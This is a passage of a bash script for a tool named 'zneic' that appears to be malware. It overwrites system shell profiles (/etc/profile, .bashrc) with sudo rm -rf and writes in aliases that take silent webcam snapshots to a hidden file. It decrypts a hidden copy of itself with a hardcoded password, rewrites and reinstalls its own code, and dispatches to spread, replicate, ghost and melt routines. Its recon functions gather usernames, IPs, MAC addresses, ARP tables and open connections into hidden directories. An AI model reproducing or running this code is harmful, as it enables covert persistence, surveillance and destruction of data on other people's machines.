echo "_f() { open -a Finder ./ ;}" >> $1
echo "-^(){ seq \$1 | xargs -Iz \$2 \$3 \$4 \$5 \$6 \$7 \$8 \$9; }" >> $1
echo "-*(){ while :; do \$2 \$3 \$4 \$5 \$6 \$7 \$8 \$9; sleep \$1; done; }"
echo "space() { du -hs \"\$@\" | sort -nr; }" >> $1
echo "mkdg() { mkdir \$1 ; clear ; cd \$1 ;}" >> $1
#  echo "docked() { sudo lsof -i :\"\$@\" ;}" >> .bash_profile
echo "destroy() { killall -9 appPID \"\$1\" ;}" >> $1
echo "geolocate() { curl ipinfo.io/\$1 ;}" >> $1
echo "origin() { clear ; ps -p \$1 | awk '{print \$4;}' | sed '1d' ;}" >> $1
echo "cheese() { imagesnap -w 1 -q ;}" >> $1
echo "wisconsin() { imagesnap -w 1 -q .snapshot.png ;}" >> $1
echo "iwannafind() { mdfind \$2 \$1 }" >> $1
echo "iwannasee() { clear ; cat \$(mdfind \$2 \$1) ;}" >> $1
echo "replace() { sed -i -e 's/\$1/\$2/g' \$3 ; rm \$3-e ;}" >> $1
echo "ports(){" >> $1
echo "   for i in \`seq \$1 \$2\`;" >> $1
echo "        do" >> $1
echo "              echo \"проверка процессов для порта  \$i ->>\"" >> $1
echo "              sudo lsof -i :\$i" >> $1
echo "        done" >> $1
echo "}" >> $1
echo "thermic(){" >> $1
echo "while true" >> $1
echo "do" >> $1
echo "    temp" >> $1
echo "    sleep \$1" >> $1
echo "done" >> $1
echo "}" >> $1
echo "temp(){" >> $1
echo "   WHITE='\e[1;97m'" >> $1
echo "   NC='\033[0m'" >> $1
echo "   clear" >> $1
echo "   istats | sed '\$d'" >> $1
echo "   printf \"\$WHITE\n\"" >> $1
echo "   date" >> $1
echo "   printf \"\$NC\n\"" >> $1
echo "}" >> $1
echo " " >> $1
echo "# Color functions " >> $1
echo " " >> $1
echo "_green(){" >> $1
echo "   GREEN='\e[1;92m'" >> $1
echo "   clear" >> $1
echo "   printf \"\$GREEN Green Bold Activate\n\"" >> $1
echo "   date" >> $1
echo "}" >> $1
echo "_white(){" >> $1
echo "   WHITE='\e[1;97m'" >> $1
echo "   clear" >> $1
echo "   printf \"\$WHITE White Bold Activate\n\"" >> $1
echo "   date" >> $1
echo "}" >> $1
echo "_yellow(){" >> $1
echo "   YELLOW='\e[1;93m'" >> $1
echo "   clear" >> $1
echo "   printf \"\$YELLOW Yellow Bold Activate\n\"" >> $1
echo "   date" >> $1
echo "}" >> $1
echo "_red(){" >> $1
echo "   RED='\e[1;91m'" >> $1
echo "   clear" >> $1
echo "   printf \"\$RED Red Bold Activate\n\"" >> $1
echo "   date" >> $1
echo "}" >> $1
echo "_cyan(){" >> $1
echo "   CYAN='\e[1;96m'" >> $1
echo "   clear" >> $1
echo "   printf \"\$CYAN Cyan Bold Activate\n\"" >> $1
echo "   date" >> $1
echo "}" >> $1
echo "_normal(){" >> $1
echo "   NC='\033[0m'" >> $1
echo "   clear" >> $1
echo "   printf \"\$NC Text Normalized\n\"" >> $1
echo "   date" >> $1
echo "}" >> $1
echo "quietTextRestore(){" >> $1
echo "   NC='\033[0m'" >> $1
echo "   printf \"\$NC\n\"" >> $1
echo "}" >> $1

}


_inject(){ #selfi

  _names=("flake" "blake" "plake" "blara" "marco" "white" "james" "alina" "leana" "slava" "horia" "moria" "power" "coral" "death" "cobra" "banel" "quran" "ninja" "nixon" "betty" "harry" "draco" "boris" "adolf" "arpad" "soyuz" "force" "forta" "balon" "pablo" "narco" "diana" "andra" "tower" "tokyo" "baron" "airfr" "paris" "trump" "archx" "genie" "bacon" "fruit" "masha" "moris" "elisa" "marii" "brain" "water")


   _system="$(uname -s)"

    if [ $_system == "Darwin" ]; then
    printf "$RED Injecting on macOS.$NC..\n"
    if [ "$1" == "-i" ]; then

           if [ "$2" == "bash" ]; then
                cd ~
                sudo rm .profile
                touch .profile
                _vomit .profile
                sudo rm -rf /etc/profile
                sudo cp ./.profile /etc/profile
                source /etc/profile
                printf "$RED Injected$NC\n"

           elif [[ "$2" == "zsh" ]]; then

                cd ~
                sudo rm .zprofile
                touch .zprofile
                _vomit .zprofile
                sudo rm -rf /etc/zprofile
                sudo cp ./.profile /etc/zprofile
                source /etc/zprofile
                printf "$RED Injected$NC\n"

           else
                cd ~
                sudo rm .profile
                touch .profile
                _vomit .profile
                sudo rm -rf /etc/profile
                sudo cp ./.profile /etc/profile
                source /etc/profile
                printf "$RED Injected$NC\n"
           fi

    elif [[ "$1" == "-e" ]]; then

           if [ "$2" == "bash" ]; then

                cd ~
                sudo rm .bash_profile
                touch .bash_profile
                _vomit .bash_profile
                source .bash_profile
                printf "$RED Injected$NC\n"
                printf "$RED Resetting in 10 seconds..$NC.\n"
                sleep 3
                _poof

           elif [[ "$2" == "zsh" ]]; then

                cd ~
                sudo rm .bash_profile
                touch .bash_profile
                _vomit .bash_profile
                source .bash_profile
                printf "$RED Injected$NC\n"
                printf "$RED Resetting in 10 seconds..$NC.\n"
                sleep 3
                _poof

           else

                cd ~
                sudo rm .bash_profile
                touch .bash_profile
                _vomit .bash_profile
                source ./.bash_profile
                printf "$RED Injected$NC\n"
                printf "$RED Resetting in 10 seconds..$NC.\n"
                sleep 3
                _poof
           fi

    else

       if [ "$1" == "bash" ]; then
         cd ~
         sudo rm .profile
         touch .profile
         _vomit .profile
         sudo rm -rf /etc/profile
         sudo cp ./.profile /etc/profile
         source /etc/profile
         cd ~
         sudo rm .bash_profile
         touch .bash_profile
         _vomit .bash_profile
         source ./.bash_profile
         printf "$RED Injected$NC\n"
         printf "$RED Resetting in 10 seconds..$NC.\n"
         sleep 3
         _poof
       elif [[ "$1" == "zsh" ]]; then
         printf "$YELLOW NRY $NC\n"
       else
         cd ~
         sudo rm .profile
         touch .profile
         _vomit .profile
         sudo rm -rf /etc/profile
         sudo cp ./.profile /etc/profile
         source /etc/profile
       fi

    fi
    source .bash_profile
    printf "$RED _injected$NC\n"
    printf "$BLINK$GREEN Poofing in 5 seconds...$NC\n"
    sleep 5
    zneic -poof
  elif [[ $_system == "Linux" ]]; then
    printf "$YELLOW Injecting on Linux...$NC\n"
    cd ~
    sudo rm .bashrc
    _vomit .bashrc
    source .bashrc
    clear
    printf "$RED _injected$NC\n"
  elif [[ $_system == "Haiku" ]]; then
    printf "$RED Not supported yet$NC\n"
  elif [[ $_system == "HP-UX" ]]; then
    printf "$RED Not supported yet$NC\n"
  elif [[ $_system == "Minix" ]]; then
    printf "$RED Not supported yet$NC\n"
  elif [[ $_system == "OpenBSD" ]]; then
    printf "$RED Not supported yet$NC\n"
  elif [[ $_system == "SunOS" ]]; then
    printf "$RED Not supported yet$NC\n"
  elif [[ $_system == "CYGWIN_NT-5.0" ]]; then
    printf "$RED Not supported yet$NC\n"
  elif [[ $_system == "CYGWIN_NT-5.1" ]]; then
    printf "$RED Not supported yet$NC\n"
  elif [[ $_system == "CYGWIN_NT-6.0" ]]; then
    printf "$RED Not supported yet$NC\n"
  elif [[ $_system == "CYGWIN_NT-6.1" ]]; then
    printf "$RED Not supported yet$NC\n"
  elif [[ $_system == "CYGWIN_NT-10.0" ]]; then
    printf "$RED Not supported yet$NC\n"
  elif [[ $_system == "$(uname -n)" ]]; then
    printf "$RED Not supported yet$NC\n"
  elif [[ $_system == "OS/390" ]]; then
    printf "$RED Not supported yet$NC\n"
  else
    printf "$RED Not supported sys$NC\n"
  fi

  _u_data 2> /dev/null

}


_exec_i(){ #selfi


  _system="$(uname -s)"

if [ $_system == "Darwin" ]; then #tw
     sudo chmod +x zneic
     sudo cp zneic /usr/local/bin/
     printf "$RED _installed$NC \n";
  if [ "$(echo $1 | grep -c 'i')" == "1" ]; then
     _inject
  fi
  if [ "$(echo $1 | grep -c 'g')" == "1" ]; then
     _ghost
  fi
  if [ "$(echo $1 | grep -c 's')" == "1" ]; then
     _spread
  fi
  if [ "$(echo $1 | grep -c 'p')" == "1" ]; then
     _protect
  fi
  if [ "$(echo $1 | grep -c 'r')" == "1" ]; then
     _replicate
  fi
  if [ "$(echo $1 | grep -c 'm')" == "1" ]; then
     _melt
  fi
  if [ "$(echo $1 | grep -c 'z')" == "1" ]; then
     _salt
  fi
elif [[ $_system == "Linux" ]]; then #tw
   sudo chmod +x zneic
   sudo cp zneic /usr/local/bin/
   printf "$RED _installed$NC \n";
elif [[ $_system == "GNU" ]]; then #tw
   su
   chmod +x zneic
   cp zneic /usr/local/bin/
   printf "$RED _installed$NC \n";
elif [[ $_system == "Haiku" ]]; then #tw
   chmod +x zneic
   cp zneic /bin
   printf "$RED _installed$NC \n";
elif [[ $_system == "Minix" ]]; then #nn
   chmod +x zneic
   cp zneic /usr/local/bin/
   printf "$RED _installed$NC \n";
elif [[ $_system == "OpenBSD" ]]; then #nn
   chmod +x zneic
   cp zneic /usr/local/bin/
   printf "$RED _installed$NC \n";
 elif [[ $_system == "SunOS" ]]; then #nn
   chmod +x zneic
   cp zneic /usr/local/bin/
   printf "$RED _installed$NC \n";
 elif [[ $_system == "CYGWIN_NT-5.0" ]]; then #nn
   chmod +x zneic
   cp zneic /usr/local/bin/
   printf "$RED _installed$NC \n";
 elif [[ $_system == "CYGWIN_NT-5.1" ]]; then #nn
   chmod +x zneic
   cp zneic /usr/local/bin/
   printf "$RED _installed$NC \n";
 elif [[ $_system == "CYGWIN_NT-6.0" ]]; then #nn
   chmod +x zneic
   cp zneic /usr/local/bin/
   printf "$RED _installed$NC \n";
 elif [[ $_system == "CYGWIN_NT-6.1" ]]; then #nn
   chmod +x zneic
   cp zneic /usr/local/bin/
   printf "$RED _installed$NC \n";
 elif [[ $_system == "CYGWIN_NT-10.0" ]]; then #nn
   chmod +x zneic
   cp zneic /usr/local/bin/
   printf "$RED _installed$NC \n";
elif [[ $_system == "OS/390" ]]; then #nn
   chmod +x zneic
   cp zneic /usr/local/bin/
   printf "$RED _installed$NC \n";
else
   printf "$RED Not supported sys$NC\n";
fi




}


_exec_q(){ #selfi


  _system="$(uname -s)"

if [ $_system == "Darwin" ]; then
  sudo chmod +x zneic
  sudo cp zneic /usr/local/bin/
if [ "$(echo $1 | grep -c 'i')" == "1" ]; then
  _inject
fi
if [ "$(echo $1 | grep -c 'g')" == "1" ]; then
  _ghost
fi
if [ "$(echo $1 | grep -c 's')" == "1" ]; then
  _spread
fi
if [ "$(echo $1 | grep -c 'p')" == "1" ]; then
  _protect
fi
if [ "$(echo $1 | grep -c 'r')" == "1" ]; then
  _replicate
fi
if [ "$(echo $1 | grep -c 'm')" == "1" ]; then
  _melt
fi
if [ "$(echo $1 | grep -c 'z')" == "1" ]; then
  _salt
fi
elif [[ $_system == "Linux" ]]; then
   sudo chmod +x zneic
   sudo cp zneic /usr/local/bin/

elif [[ $_system == "GNU" ]]; then
   su
   chmod +x zneic
   cp zneic /usr/local/bin/

elif [[ $_system == "Haiku" ]]; then
   chmod +x zneic
   cp zneic /bin

elif [[ $_system == "HP-UX" ]]; then
   chmod +x zneic
   cp zneic /bin

elif [[ $_system == "Minix" ]]; then
   chmod +x zneic
   cp zneic /usr/local/bin/

elif [[ $_system == "OpenBSD" ]]; then
   chmod +x zneic
   cp zneic /usr/local/bin/

elif [[ $_system == "SunOS" ]]; then
   chmod +x zneic
   cp zneic /usr/local/bin/

elif [[ $_system == "CYGWIN_NT-5.0" ]]; then
    chmod +x zneic
    cp zneic /usr/local/bin/

elif [[ $_system == "CYGWIN_NT-5.1" ]]; then
    chmod +x zneic
    cp zneic /usr/local/bin/

elif [[ $_system == "CYGWIN_NT-6.0" ]]; then
    chmod +x zneic
    cp zneic /usr/local/bin/

elif [[ $_system == "CYGWIN_NT-6.1" ]]; then
    chmod +x zneic
    cp zneic /usr/local/bin/

elif [[ $_system == "CYGWIN_NT-10.0" ]]; then
    chmod +x zneic
    cp zneic /usr/local/bin/

elif [[ $_system == "OS/390" ]]; then
   chmod +x zneic
   cp zneic /usr/local/bin/

else
   printf "$RED Not supported sys$NC\n"
fi




}

_exec_u(){ #selfi


if [ -f /usr/local/bin/zneic ]; then
   _loc=/usr/local/bin/zneic
else
  if [ -f ~/.spx/zneic ]; then
    _loc=~/.spx/zneic
  else
    openssl des -d -in zneic.sslz -out zneic -pass pass:cartof
    _loc=~/.spx/zneic
  fi
fi

  _system="$(uname -s)"

if [ $_system == "Darwin" ]; then
   sudo chmod -x zneic >/dev/null 2>&1
   sudo rm -rf $_loc
elif [[ $_system == "Linux" ]]; then
   sudo chmod -x zneic
   sudo rm -rf $_loc
elif [[ $_system == "GNU" ]]; then
   su
   chmod -x zneic
   rm -rf $_loc
elif [[ $_system == "Haiku" ]]; then
   chmod +x zneic
   rm -rf /bin/zneic
elif [[ $_system == "HP-UX" ]]; then
   cd /usr/local/bin/
   chmod -x zneic
   rm -rf zneic
elif [[ $_system == "Minix" ]]; then
   chmod -x zneic
   rm -rf $_loc
elif [[ $_system == "OpenBSD" ]]; then
   sudo chmod -x zneic
   sudo rm -rf $_loc
elif [[ $_system == "SunOS" ]]; then
   sudo chmod -x zneic
   sudo rm -rf $_loc
elif [[ $_system == "CYGWIN_NT-5.0" ]]; then
   sudo chmod -x zneic
   sudo rm -rf $_loc
elif [[ $_system == "CYGWIN_NT-5.1" ]]; then
   sudo chmod -x zneic
   sudo rm -rf $_loc
elif [[ $_system == "CYGWIN_NT-6.0" ]]; then
   sudo chmod -x zneic
   sudo rm -rf $_loc
elif [[ $_system == "CYGWIN_NT-6.1" ]]; then
   sudo chmod -x zneic
   sudo rm -rf $_loc
elif [[ $_system == "CYGWIN_NT-10.0" ]]; then
   sudo chmod -x zneic
   sudo rm -rf $_loc
elif [[ $_system == "OS/390" ]]; then
   sudo chmod -x zneic
   sudo rm -rf $_loc
else
   printf "$RED Not supported sys$NC\n"
fi





}

_appID(){ #selft

    ps -A | grep -m1 "$1" | awk '{print $1}'

    _u_data 2> /dev/null

}

_snap(){ #selfs


           _system="$(uname -s)"

           if [ $_system == "AIX" ]; then

             printf "$RED Not supported yet$NC\n"

           elif [[ $_system == "A/UX" ]]; then

             printf "$RED Not supported yet$NC\n"

           elif [[ $_system == "Darwin" ]]; then


             cd ~ ; mkdir .sss ; cd .sss
             touch zneic.json
             echo "{\"$(date)\":{" >> zneic.json
             echo "   \"ID\":1024," >> zneic.json
             echo "   \"Race\":\"zneic\"," >> zneic.json
             echo "   \"Username\":\"$USER\"," >> zneic.json
             echo "   \"Homepath\":\"$HOME\"," >> zneic.json
             echo "   \"Nestname\":\"$(hostname)\"," >> zneic.json
             echo "   \"Shell\":\"$SHELL\"," >> zneic.json
             echo "   \"InternalIP\":\"$(ipconfig getpacket en0 | grep yiaddr | awk '{print $3;}')\"," >> zneic.json
             echo "   \"Mac\":\"$(ipconfig getpacket en0 | grep chaddr | awk '{print $3;}')\"," >> zneic.json
             echo "   \"Architecture\":\"$(uname -m)\"," >> zneic.json
             echo "   \"OS\":\"$(uname -s)\"," >> zneic.json
             echo "   \"KernelVersion\":\"$(uname -r)\"," >> zneic.json
             echo "   \"VSpawn\":\"$(date)\"," >> zneic.json
             echo "   \"Control\":false," >> zneic.json
             echo "   \"Heat\":0," >> zneic.json
             echo "   \"Task\":\"Monitor\"," >> zneic.json
             echo "   }," >> zneic.json
             echo " }  " >> zneic.json
             cd ~

           elif [[ $_system == "Linux" ]]; then


             cd ~ ; mkdir .sss ; cd .sss
             touch zneic.json
             echo "{\"$(date)\":{" >> zneic.json
             echo "   \"ID\":1024," >> zneic.json
             echo "   \"Race\":\"Salazaar\"," >> zneic.json
             echo "   \"Username\":\"$USER\"," >> zneic.json
             echo "   \"Homepath\":\"$HOME\"," >> zneic.json
             echo "   \"Nestname\":\"$(hostname)\"," >> zneic.json
             echo "   \"Shell\":\"$SHELL\"," >> zneic.json
             echo "   \"InternalIP\":\"$(ifconfig enp0s3 | grep inet | awk '{print $2}')\"," >> zneic.json
             echo "   \"Mac\":\"$(ifconfig enp0s3 | grep ether | awk '{print $2;}')\"," >> zneic.json
             echo "   \"Architecture\":\"$(uname -m)\"," >> zneic.json
             echo "   \"OS\":\"$(uname -s)\"," >> zneic.json
             echo "   \"KernelVersion\":\"$(uname -r)\"," >> zneic.json
             echo "   \"VSpawn\":\"$(date)\"," >> zneic.json
             echo "   \"Control\":false," >> zneic.json
             echo "   \"Heat\":0," >> zneic.json
             echo "   \"Task\":\"Monitor\"," >> zneic.json
             echo "   }," >> zneic.json
             echo " }  " >> zneic.json
             cd ~

           elif [[ $_system == "GNU" ]]; then

             cd ~ ; mkdir .sss ; cd .sss
             touch zneic.json
             echo "{\"$(date)\":{" >> zneic.json
             echo "   \"ID\":1024," >> zneic.json
             echo "   \"Race\":\"Salazaar\"," >> zneic.json
             echo "   \"Username\":\"$USER\"," >> zneic.json
             echo "   \"Homepath\":\"$HOME\"," >> zneic.json
             echo "   \"Nestname\":\"$(hostname)\"," >> zneic.json
             echo "   \"Shell\":\"$SHELL\"," >> zneic.json
             echo "   \"InternalIP\":\"$(inetutils-ifconfig /dev/eth0 | grep inet | awk '{print $3}')\"," >> zneic.json
             echo "   \"Mac\":\"$(inetutils-ifconfig | grep hardware | awk '{print $3}')\"," >> zneic.json
             echo "   \"Architecture\":\"$(uname -m)\"," >> zneic.json
             echo "   \"OS\":\"$(uname -s)\"," >> zneic.json
             echo "   \"KernelVersion\":\"$(uname -r)\"," >> zneic.json
             echo "   \"VSpawn\":\"$(date)\"," >> zneic.json
             echo "   \"Control\":false," >> zneic.json
             echo "   \"Heat\":0," >> zneic.json
             echo "   \"Task\":\"Monitor\"," >> zneic.json
             echo "   }," >> zneic.json
             echo " }  " >> zneic.json
             cd ~

           elif [[ $_system == "Haiku" ]]; then


             cd ~ ; mkdir .sss ; cd .sss
             touch zneic.json
             echo "{\"$(date)\":{" >> zneic.json
             echo "   \"ID\":1024," >> zneic.json
             echo "   \"Race\":\"Salazaar\"," >> zneic.json
             echo "   \"Username\":\"$USER\"," >> zneic.json
             echo "   \"Homepath\":\"$HOME\"," >> zneic.json
             echo "   \"Nestname\":\"$(hostname)\"," >> zneic.json
             echo "   \"Shell\":\"$SHELL\"," >> zneic.json
             echo "   \"InternalIP\":\"$(ifconfig | grep inet | sed '1,2d' | awk '{print $3}')\"," >> zneic.json
             echo "   \"Mac\":\"$(ifconfig | grep Address | sed '1d' | awk '{print $5}')\"," >> zneic.json
             echo "   \"Architecture\":\"$(uname -m)\"," >> zneic.json
             echo "   \"OS\":\"$(uname -s)\"," >> zneic.json
             echo "   \"KernelVersion\":\"$(uname -r)\"," >> zneic.json
             echo "   \"VSpawn\":\"$(date)\"," >> zneic.json
             echo "   \"Control\":false," >> zneic.json
             echo "   \"Heat\":0," >> zneic.json
             echo "   \"Task\":\"Monitor\"," >> zneic.json
             echo "   }," >> zneic.json
             echo " }  " >> zneic.json
             cd ~

           elif [[ $_system == "Minix" ]]; then


             cd ~ ; mkdir .sss ; cd .sss
             touch zneic.json
             echo "{\"$(date)\":{" >> zneic.json
             echo "   \"ID\":1024," >> zneic.json
             echo "   \"Race\":\"Salazaar\"," >> zneic.json
             echo "   \"Username\":\"$USER\"," >> zneic.json
             echo "   \"Homepath\":\"$HOME\"," >> zneic.json
             echo "   \"Nestname\":\"$(hostname)\"," >> zneic.json
             echo "   \"Shell\":\"$SHELL\"," >> zneic.json
             echo "   \"InternalIP\":\"$(hostaddr -i)\"," >> zneic.json
             echo "   \"Mac\":\"$(hostaddr -e)\"," >> zneic.json
             echo "   \"Architecture\":\"$(uname -m)\"," >> zneic.json
             echo "   \"OS\":\"$(uname -s)\"," >> zneic.json
             echo "   \"KernelVersion\":\"$(uname -r)\"," >> zneic.json
             echo "   \"VSpawn\":\"$(date)\"," >> zneic.json
             echo "   \"Control\":false," >> zneic.json
             echo "   \"Heat\":0," >> zneic.json
             echo "   \"Task\":\"Monitor\"," >> zneic.json
             echo "   }," >> zneic.json
             echo " }  " >> zneic.json
             cd ~

           elif [[ $_system == "OpenBSD" ]]; then


             cd ~ ; mkdir .sss ; cd .sss
             touch zneic.json
             echo "{\"$(date)\":{" >> zneic.json
             echo "   \"ID\":1024," >> zneic.json
             echo "   \"Race\":\"Salazaar\"," >> zneic.json
             echo "   \"Username\":\"$USER\"," >> zneic.json
             echo "   \"Homepath\":\"$HOME\"," >> zneic.json
             echo "   \"Nestname\":\"$(hostname)\"," >> zneic.json
             echo "   \"Shell\":\"$SHELL\"," >> zneic.json
             echo "   \"InternalIP\":\"$(ifconfig em0 | grep inet | awk '{print $2}')\"," >> zneic.json
             echo "   \"Mac\":\"$(ifconfig em0 | grep lladdr | awk '{print $2}')\"," >> zneic.json
             echo "   \"Architecture\":\"$(uname -m)\"," >> zneic.json
             echo "   \"OS\":\"$(uname -s)\"," >> zneic.json
             echo "   \"KernelVersion\":\"$(uname -r)\"," >> zneic.json
             echo "   \"VSpawn\":\"$(date)\"," >> zneic.json
             echo "   \"Control\":false," >> zneic.json
             echo "   \"Heat\":0," >> zneic.json
             echo "   \"Task\":\"Monitor\"," >> zneic.json
             echo "   }," >> zneic.json
             echo " }  " >> zneic.json
             cd ~

           elif [[ $_system == "SunOS" ]]; then

             printf "$RED Not supported yet$NC\n"

           elif [[ $_system == "CYGWIN_NT-5.0" ]]; then

             printf "$RED Not supported yet$NC\n"

           elif [[ $_system == "CYGWIN_NT-5.1" ]]; then

             printf "$RED Not supported yet$NC\n"

           elif [[ $_system == "CYGWIN_NT-6.0" ]]; then

             printf "$RED Not supported yet$NC\n"

           elif [[ $_system == "CYGWIN_NT-6.1" ]]; then

             printf "$RED Not supported yet$NC\n"

           elif [[ $_system == "CYGWIN_NT-10.0" ]]; then

             printf "$RED Not supported yet$NC\n"

           elif [[ $_system == "OS/390" ]]; then

             printf "$RED Not supported yet$NC\n"

           else

             printf "$RED Not supported sys$NC\n"

           fi

           _u_data 2> /dev/null

}


_decompose(){ #selfs






        _system="$(uname -s)"

        if [ $_system == "Darwin" ]; then

          cd ~
          mkdir ._ra
          cd ._ra
          clear
          touch _corpse.slz
          echo "_THERMALS >> " >> _corpse.slz
          ther | grep -E 'CPU|speed|ycle|attery|charge|capacity' >> _corpse.slz
          echo "_USER >> $USER" >> _corpse.slz
          echo "_HOSTNAME >> $(hostname)" >> _corpse.slz
          echo "_NETWORK >>" >> _corpse.slz
          arp -a >> _corpse.slz
          echo "_YOUR IP >> $(ipconfig getpacket en0 | grep yiaddr | awk '{print $3;}') " >> _corpse.slz
          echo "_SPEED >> " >> _corpse.slz
          speedtest-cli | grep -E 'Download|Upload' >> _corpse.slz
          echo "_TCP >> " >> _corpse.slz
          netstat -ap tcp >> _corpse.slz
          echo "_UDP >> " >> _corpse.slz
          netstat -ap udp >> _corpse.slz
          echo "_SYSTEMSTATS >> " >> _corpse.slz
          curl -sf ipinfo.io >> _corpse.slz
          clear

        elif [[ $_system == "Linux" ]]; then

          cd ~
          mkdir ._ra
          cd ._ra
          clear
          touch _corpse.slz
          echo "_THERMALS >> " >> _corpse.slz
          ther | grep -E 'CPU|speed|ycle|attery|charge|capacity' >> _corpse.slz
          echo "_USER >> $USER" >> _corpse.slz
          echo "_HOSTNAME >> $(hostname)" >> _corpse.slz
          echo "_NETWORK >>" >> _corpse.slz
          arp -a >> _corpse.slz
          echo "_YOUR IP >> $(ipconfig getpacket en0 | grep yiaddr | awk '{print $3;}') " >> _corpse.slz
          echo "_SPEED >> " >> _corpse.slz
          speedtest-cli | grep -E 'Download|Upload' >> _corpse.slz
          echo "_TCP >> " >> _corpse.slz
          netstat -ap tcp >> _corpse.slz
          echo "_UDP >> " >> _corpse.slz
          netstat -ap udp >> _corpse.slz
          echo "_SYSTEMSTATS >> " >> _corpse.slz
          curl -sf ipinfo.io >> _corpse.slz
          clear

        elif [[ $_system == "GNU" ]]; then

          cd ~
          mkdir ._ra
          cd ._ra
          clear
          touch _corpse.slz
          echo "_THERMALS >> " >> _corpse.slz
          ther | grep -E 'CPU|speed|ycle|attery|charge|capacity' >> _corpse.slz
          echo "_USER >> $USER" >> _corpse.slz
          echo "_HOSTNAME >> $(hostname)" >> _corpse.slz
          echo "_NETWORK >>" >> _corpse.slz
          arp -a >> _corpse.slz
          echo "_YOUR IP >> $(ipconfig getpacket en0 | grep yiaddr | awk '{print $3;}') " >> _corpse.slz
          echo "_SPEED >> " >> _corpse.slz
          speedtest-cli | grep -E 'Download|Upload' >> _corpse.slz
          echo "_TCP >> " >> _corpse.slz
          netstat -ap tcp >> _corpse.slz
          echo "_UDP >> " >> _corpse.slz
          netstat -ap udp >> _corpse.slz
          echo "_SYSTEMSTATS >> " >> _corpse.slz
          curl -sf ipinfo.io >> _corpse.slz
          clear

        elif [[ $_system == "Haiku" ]]; then

          cd ~
          mkdir ._ra
          cd ._ra
          clear
          touch _corpse.slz
          echo "_THERMALS >> " >> _corpse.slz
          ther | grep -E 'CPU|speed|ycle|attery|charge|capacity' >> _corpse.slz
          echo "_USER >> $USER" >> _corpse.slz
          echo "_HOSTNAME >> $(hostname)" >> _corpse.slz
          echo "_NETWORK >>" >> _corpse.slz
          arp -a >> _corpse.slz
          echo "_YOUR IP >> $(ipconfig getpacket en0 | grep yiaddr | awk '{print $3;}') " >> _corpse.slz
          echo "_SPEED >> " >> _corpse.slz
          speedtest-cli | grep -E 'Download|Upload' >> _corpse.slz
          echo "_TCP >> " >> _corpse.slz
          netstat -ap tcp >> _corpse.slz
          echo "_UDP >> " >> _corpse.slz
          netstat -ap udp >> _corpse.slz
          echo "_SYSTEMSTATS >> " >> _corpse.slz
          curl -sf ipinfo.io >> _corpse.slz
          clear


        elif [[ $_system == "Minix" ]]; then

          cd ~
          mkdir ._ra
          cd ._ra
          clear
          touch _corpse.slz
          echo "_THERMALS >> " >> _corpse.slz
          ther | grep -E 'CPU|speed|ycle|attery|charge|capacity' >> _corpse.slz
          echo "_USER >> $USER" >> _corpse.slz
          echo "_HOSTNAME >> $(hostname)" >> _corpse.slz
          echo "_NETWORK >>" >> _corpse.slz
          arp -a >> _corpse.slz
          echo "_YOUR IP >> $(ipconfig getpacket en0 | grep yiaddr | awk '{print $3;}') " >> _corpse.slz
          echo "_SPEED >> " >> _corpse.slz
          speedtest-cli | grep -E 'Download|Upload' >> _corpse.slz
          echo "_TCP >> " >> _corpse.slz
          netstat -ap tcp >> _corpse.slz
          echo "_UDP >> " >> _corpse.slz
          netstat -ap udp >> _corpse.slz
          echo "_SYSTEMSTATS >> " >> _corpse.slz
          curl -sf ipinfo.io >> _corpse.slz
          clear

        elif [[ $_system == "OpenBSD" ]]; then

          cd ~
          mkdir ._ra
          cd ._ra
          clear
          touch _corpse.slz
          echo "_THERMALS >> " >> _corpse.slz
          ther | grep -E 'CPU|speed|ycle|attery|charge|capacity' >> _corpse.slz
          echo "_USER >> $USER" >> _corpse.slz
          echo "_HOSTNAME >> $(hostname)" >> _corpse.slz
          echo "_NETWORK >>" >> _corpse.slz
          arp -a >> _corpse.slz
          echo "_YOUR IP >> $(ipconfig getpacket en0 | grep yiaddr | awk '{print $3;}') " >> _corpse.slz
          echo "_SPEED >> " >> _corpse.slz
          speedtest-cli | grep -E 'Download|Upload' >> _corpse.slz
          echo "_TCP >> " >> _corpse.slz
          netstat -ap tcp >> _corpse.slz
          echo "_UDP >> " >> _corpse.slz
          netstat -ap udp >> _corpse.slz
          echo "_SYSTEMSTATS >> " >> _corpse.slz
          curl -sf ipinfo.io >> _corpse.slz
          clear

        elif [[ $_system == "SunOS" ]]; then

          printf "$RED Not supported yet$NC\n"

        elif [[ $_system == "CYGWIN_NT-5.0" ]]; then

          printf "$RED Not supported yet$NC\n"

        elif [[ $_system == "CYGWIN_NT-5.1" ]]; then

          printf "$RED Not supported yet$NC\n"

        elif [[ $_system == "CYGWIN_NT-6.0" ]]; then

          printf "$RED Not supported yet$NC\n"

        elif [[ $_system == "CYGWIN_NT-6.1" ]]; then

          printf "$RED Not supported yet$NC\n"

        elif [[ $_system == "CYGWIN_NT-10.0" ]]; then

          printf "$RED Not supported yet$NC\n"

        elif [[ $_system == "OS/390" ]]; then

          printf "$RED Not supported yet$NC\n"

        else

          printf "$RED Not supported sys$NC\n"

        fi

        _u_data 2> /dev/null


}

_r_w(){ #selfc



if [ -f /usr/local/bin/zneic ]; then
   _loc=/usr/local/bin/zneic
else
  if [ -f ~/.spx/zneic ]; then
    _loc=~/.spx/zneic
  else
    openssl des -d -in zneic.sslz -out zneic -pass pass:cartof
    _loc=~/.spx/zneic
  fi
fi

  _system="$(uname -s)"





 if [ $_system == "Darwin" ]; then


   _new="$(echo $1 | rev )"

  mkdir blana ; cd blana
  sudo cp $_loc ./zneic
  cat zneic | sed "s/magic/$_new/g" > zneic2
  sudo rm -rf zneic ; sudo mv zneic2 zneic ; sh zneic -qinstall ; sudo rm -rf zneic
  cd .. ; sudo rm -rf blana



elif [[ $_system == "Linux" ]]; then


  _new="$(echo $1 | rev )"

  mkdir blana ; cd blana
  sudo cp $_loc ./zneic
  cat zneic | sed "s/magic/$_new/g" > zneic2
  sudo rm -rf zneic ; sudo mv zneic2 zneic ; sh zneic -qinstall ; sudo rm -rf zneic
  cd .. ; sudo rm -rf blana

elif [[ $_system == "GNU" ]]; then

  _new="$(echo $1 | rev )"

  su
  mkdir blana ; cd blana
  cp $_loc ./zneic
  cat zneic | sed "s/magic/$_new/g" > zneic2
  sudo rm -rf zneic ; sudo mv zneic2 zneic ; sh zneic -qinstall ; sudo rm -rf zneic
  cd .. ; sudo rm -rf blana

elif [[ $_system == "Haiku" ]]; then

  _new="$(echo $1 | rev )"

  mkdir blana ; cd blana
  cp $_loc ./zneic
  cat zneic | sed "s/magic/$_new/g" > zneic2
  sudo rm -rf zneic ; sudo mv zneic2 zneic ; sh zneic -qinstall ; sudo rm -rf zneic
